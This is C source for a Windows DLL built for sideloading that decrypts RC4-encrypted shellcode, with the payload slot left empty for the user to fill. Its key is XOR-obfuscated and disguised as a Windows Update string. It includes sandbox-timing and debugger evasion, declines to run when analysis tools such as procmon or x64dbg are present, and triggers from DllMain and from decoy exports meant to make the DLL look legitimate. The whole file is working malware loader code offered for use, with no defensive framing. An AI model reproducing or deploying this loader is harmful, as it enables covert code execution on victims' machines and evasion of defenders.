#include <Windows.h>
#include <stdio.h>

#define DECRYPTION_KEY        "WindowsUpdateAgent2024"
#define KEY_LENGTH            22

#pragma warning (disable:4996)

// RC4 Implementation (same as before)
typedef struct {
    unsigned char S[256];
    int i, j;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, const unsigned char *key, int keylen) {
    ctx->i = ctx->j = 0;
    
    for (int i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }
    
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % keylen]) & 255;
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
}

unsigned char rc4_byte(RC4_CTX *ctx) {
    ctx->i = (ctx->i + 1) & 255;
    ctx->j = (ctx->j + ctx->S[ctx->i]) & 255;
    
    unsigned char temp = ctx->S[ctx->i];
    ctx->S[ctx->i] = ctx->S[ctx->j];
    ctx->S[ctx->j] = temp;
    
    return ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 255];
}

void rc4_decrypt(unsigned char *data, int datalen, const unsigned char *key, int keylen) {
    RC4_CTX ctx;
    rc4_init(&ctx, key, keylen);
    
    for (int i = 0; i < datalen; i++) {
        data[i] ^= rc4_byte(&ctx);
    }
}

unsigned char encrypted_shellcode[] = {
    // Put your encrypted shellcode here
};
unsigned int shellcode_size = sizeof(encrypted_shellcode);

char* GetDecryptionKey() {
    // Obfuscate the key in memory
    static char key[KEY_LENGTH + 1];
    const char obfuscated[] = {
        'W' ^ 0x55, 'i' ^ 0x55, 'n' ^ 0x55, 'd' ^ 0x55, 'o' ^ 0x55, 'w' ^ 0x55, 's' ^ 0x55,
        'U' ^ 0x55, 'p' ^ 0x55, 'd' ^ 0x55, 'a' ^ 0x55, 't' ^ 0x55, 'e' ^ 0x55, 'A' ^ 0x55,
        'g' ^ 0x55, 'e' ^ 0x55, 'n' ^ 0x55, 't' ^ 0x55, '2' ^ 0x55, '0' ^ 0x55, '2' ^ 0x55,
        '4' ^ 0x55, 0
    };
    
    for (int i = 0; i < KEY_LENGTH; i++) {
        key[i] = obfuscated[i] ^ 0x55;
    }
    key[KEY_LENGTH] = 0;
    
    return key;
}

// Simple delay to evade sandboxes
void evade_delay() {
    // Check if running in a sandbox by measuring small time differences
    LARGE_INTEGER frequency, start, end;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start);
    
    // Do some CPU work
    for (volatile int i = 0; i < 1000000; i++);
    
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / frequency.QuadPart;
    
    // If execution was too fast (< 1ms), we're likely in a sandbox
    if (elapsed < 1.0) {
        // Add artificial delay to avoid immediate detection
        Sleep(5000);
    }
}

// In-process execution function
BOOL ExecuteInProcess() {
    // Basic evasion
    evade_delay();
    
    // Check if we're being debugged
    if (IsDebuggerPresent()) {
        return FALSE;
    }
    
    // Allocate memory for decrypted shellcode
    PBYTE shellcode_exec = (PBYTE)VirtualAlloc(
        NULL, 
        shellcode_size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE
    );
    
    if (!shellcode_exec) {
        return FALSE;
    }
    
    // Copy and decrypt
    memcpy(shellcode_exec, encrypted_shellcode, shellcode_size);
    const char* key = GetDecryptionKey();
    rc4_decrypt(shellcode_exec, shellcode_size, (unsigned char*)key, strlen(key));
    
    // Change memory protection to executable
    DWORD old_protect;
    if (!VirtualProtect(shellcode_exec, shellcode_size, PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFree(shellcode_exec, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Create thread to execute shellcode
    // This avoids blocking the main thread
    HANDLE hThread = CreateThread(
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)shellcode_exec, 
        NULL, 
        0, 
        NULL
    );
    
    if (hThread) {
        // Option 1: Wait for completion (could cause app hang)
        // WaitForSingleObject(hThread, INFINITE);
        
        // Option 2: Don't wait (more stealthy, but thread continues after DLL unloads)
        CloseHandle(hThread);
    } else {
        // Fallback: execute directly (blocks)
        ((void(*)())shellcode_exec)();
    }
    
    // If we don't wait, don't free memory (thread might still be using it)
    // VirtualFree(shellcode_exec, 0, MEM_RELEASE);
    
    return TRUE;
}

// Export functions that might be called by the host application
// This makes the DLL appear legitimate

extern "C" __declspec(dllexport) void SomeExportedFunction() {
    // Could be called by the host app
    ExecuteInProcess();
}

extern "C" __declspec(dllexport) void DllRegisterServer() {
    // COM registration function - often called by regsvr32
    ExecuteInProcess();
}

extern "C" __declspec(dllexport) void DllUnregisterServer() {
    // Another common export
    ExecuteInProcess();
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    HANDLE hThread = NULL;
    
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            
            // Add process name checks for better OPSEC
            CHAR currentProcess[MAX_PATH];
            GetModuleFileNameA(NULL, currentProcess, MAX_PATH);
            
            // Extract just the filename
            char* processName = strrchr(currentProcess, '\\');
            if (processName) {
                processName++;
            } else {
                processName = currentProcess;
            }
            
            // Avoid executing in analysis tools
            if (strstr(processName, "procmon") || 
                strstr(processName, "procexp") ||
                strstr(processName, "wireshark") ||
                strstr(processName, "x64dbg") ||
                strstr(processName, "ollydbg")) {
                return TRUE;  // Don't execute in analysis tools
            }
            
            // For sideloading, we want to execute in the target app's context
            // Check if this is the application we expect to be sideloaded into
            if (strstr(processName, "targetapp.exe") || 
                strstr(processName, "legitapp.exe") ||
                // If no specific target, execute in any non-system process
                (!strstr(processName, "system") && !strstr(processName, "svchost"))) {
                
                // Use a thread to avoid blocking
                hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteInProcess, NULL, 0, NULL);
                if (hThread) {
                    CloseHandle(hThread);
                }
            }
            return TRUE;
            
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    
    return TRUE;
}
